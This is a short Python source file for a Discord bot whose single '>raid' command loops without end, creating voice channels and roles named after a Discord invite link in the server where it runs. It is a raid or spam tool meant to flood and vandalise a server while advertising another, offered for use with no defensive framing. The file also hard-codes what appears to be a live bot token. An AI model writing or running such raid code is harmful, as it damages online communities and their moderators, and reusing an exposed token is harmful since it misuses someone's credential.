import discord
from discord.ext import commands

bot = commands.Bot(command_prefix=">", intents=discord.Intents().all())

@bot.command()
async def raid(ctx):
    guild = ctx.guild
    while True:
        await guild.create_voice_channel("discord.gg/yn8z6JEdWg")
        await guild.create_role("discord.gg/yn8z6JEdWg")

bot.run("MTA5NjQ4NDg1OTQ3Nzc1NDAwOA.GWs0CD.4g--dbq7bFN6iK32xYpd68A_J1V0mac_VOyYO0")